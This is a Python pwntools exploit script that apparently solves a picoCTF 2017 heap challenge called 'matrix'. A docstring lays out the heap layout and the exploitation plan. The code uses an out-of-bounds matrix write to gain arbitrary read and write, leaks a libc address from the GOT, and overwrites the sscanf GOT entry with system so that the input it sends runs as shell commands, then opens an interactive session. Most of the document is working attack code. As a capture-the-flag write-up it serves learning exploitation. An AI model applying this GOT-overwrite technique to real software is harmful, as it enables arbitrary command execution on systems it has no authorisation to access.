"""
Commands:
	create 4 1
	create 1 1
	set    0 0 0 0.5

Result:

|  address   |   matrix1  |   matrix2  |            |            |
|------------|------------|------------|------------|------------|
| 0x804a180: | 0x0804c010 | 0x0804c038 | ?????????? | ?????????? |
|------------|------------|------------|------------|------------|


|  address   |            |            | heap stuff |size of data|
|------------|------------|------------|------------|------------|
| 0x804c000: | ?????????? | ?????????? | 0x00000000 | 0x00000011 |
|------------|------------|------------|------------|------------|
|  address   |  m1 rows   | m1 columns |  m1 data   |            |
|------------|------------|------------|------------|------------|
| 0x804c010: | 0x00000004 | 0x00000001 | 0x0804c020 | ?????????? |
|------------|------------|------------|------------|------------|
|  address   |  m1[0][0]  |  m1[1][0]  |  m1[2][0]  |  m1[3][0]  |
|------------|------------|------------|------------|------------|
| 0x804c020: |     0.5    |      0     |      0     |     0      |
|------------|------------|------------|------------|------------|
|  address   | heap stuff |size of data|  m2 rows   | m2 columns |
|------------|------------|------------|------------|------------|
| 0x804c030: | 0x00000000 | 0x00000011 | 0x00000001 | 0x00000001 |
|------------|------------|------------|------------|------------|
|  address   |  m2 data   |            |  m2[0][0]  |            |
|------------|------------|------------|------------|------------|
| 0x804c040: | 0x0804c048 | ?????????? |      0     |            |
|------------|------------|------------|------------|------------|

Use: 
    set 0 2 0 [addres_as_float]
to overwrite the data in 0x804c040 to your chosen address.

Then we can leak address from libc using:
    get 1 0 0
And convert the float answer to address.
After leaking address of known function 
    if we know the offset of it to another function,
    we can calculate the address of libc 
    and so know the address of every function in libc

For example, after knowing the address of libc:
    we can overwrite the address in 0x804c040 to fgets in GOT.
Then we can use:
    set 1 0 0 [value_as_float]
To overwrite the address of fgets in the GOT to any address we want.

For example, the address of system.
Then we can write command and it will be run by system([my_command])
"""
from pwn import *
import struct

# os.environ["QEMU_LD_PREFIX"] = '/home/naweiss/i386-linux-gnu'
# p = process(['qemu-i386','./matrix'])
p = remote('shell2017.picoctf.com', 9417)

def address_to_float(address):
    return struct.unpack('<f', struct.pack('<L',address))[0]

def float_to_address(addr_as_float):
    return struct.unpack('<L', struct.pack('<f', addr_as_float))[0]

def init():
    print p.recvuntil("Enter command:")
    p.sendline('create 4 1')
    print p.recvuntil("Enter command:")
    p.sendline('create 1 1')
    print p.recvuntil("Enter command:")

def leak(address):
    p.sendline('set 0 2 0 %s' % address_to_float(address))
    print p.recvuntil("Enter command:")
    p.sendline('get 1 0 0')
    data = p.recvuntil("Enter command:")  
    log.info("data: "+data)
    fp = float(data[len('Matrix[0][0] = '):data.index('\n')])
    return float_to_address(fp)

def overwrite(orig_address, address):
    p.sendline('set 0 2 0 %s' % address_to_float(orig_address))
    print p.recvuntil("Enter command:")
    p.sendline('set 1 0 0 %s' % address_to_float(address))
    print p.recvuntil("Enter command:")

init()
# $ readelf -s ./i386-linux-gnu/lib/libc.so.6 | grep system
""" on remote: SYSTEM_LIBC = 0x3e3e0 """
SYSTEM_LIBC = 0x3ada0
# $ readelf -s ./i386-linux-gnu/lib/libc.so.6 | grep puts
""" on remote: PUTS_LIBC   = 0x64da0 """
PUTS_LIBC   = 0x5fca0
# (gdb) info addr printf@got.plt
PUTS_GOT    = 0x804a11c
# (gdb) info addr __isoc99_sscanf@got.plt
SSCANF_GOT  = 0x804a12c

OFFSET      = SYSTEM_LIBC-PUTS_LIBC
SYSTEM_REAL = leak(PUTS_GOT)+OFFSET
log.info('system:    %s' % hex(SYSTEM_REAL))

overwrite(SSCANF_GOT,SYSTEM_REAL)

# Important note:
#   The code use sscanf multiple times,
#   so every command we will type will be executed multiple times
p.interactive()